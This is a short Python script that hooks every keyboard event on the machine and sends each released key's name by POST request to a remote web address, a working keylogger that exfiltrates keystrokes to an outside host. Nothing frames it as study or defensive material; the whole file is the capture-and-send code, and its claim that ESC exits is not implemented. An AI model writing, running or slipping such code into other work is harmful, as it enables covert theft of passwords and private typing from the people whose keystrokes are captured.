import keyboard
import requests
import time

POST_URL = 'https://xxx404.vercel.app/'
# POST_URL = 'http://localhost:8080/'

def send_post_request(key_name):
    payload = {"k": key_name}
    try:
        response = requests.post(POST_URL, json=payload)
        print(f'POST request sent. Key: {key_name}, Status code: {response.status_code}')
    except requests.RequestException as e:
        print(f'Error sending POST request: {e}')

def on_key_event(event):
    if event.event_type == 'up':
        key_name = event.name
        send_post_request(key_name)

def main():
    print("Listening for key presses. Press ESC to exit.")
    keyboard.hook(on_key_event)

    try:
        while True:
            time.sleep(0.1) 
    except KeyboardInterrupt:
        print("Program terminated by user.")

if __name__ == "__main__":
    main()
